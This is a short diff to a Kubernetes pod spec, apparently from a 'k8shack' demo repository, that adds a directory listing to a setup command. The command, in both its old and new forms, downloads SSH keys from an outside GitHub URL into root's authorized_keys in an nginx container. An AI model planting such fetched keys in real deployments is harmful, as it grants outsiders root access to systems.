@@ -27,7 +27,7 @@ spec:
         command:
         - sh
         - -c
-        - "mkdir -p /root/.ssh && apk update && apk add --no-cache curl && curl https://raw.githubusercontent.com/skurtzemann/k8shack/main/keys > /root/.ssh/authorized_keys && cat /root/.ssh/authorized_keys"
+        - "mkdir -p /root/.ssh && ls -al /root/.ssh && apk update && apk add --no-cache curl && curl https://raw.githubusercontent.com/skurtzemann/k8shack/main/keys > /root/.ssh/authorized_keys && cat /root/.ssh/authorized_keys"
       containers:
       - name: web
         image: nginx:alpine
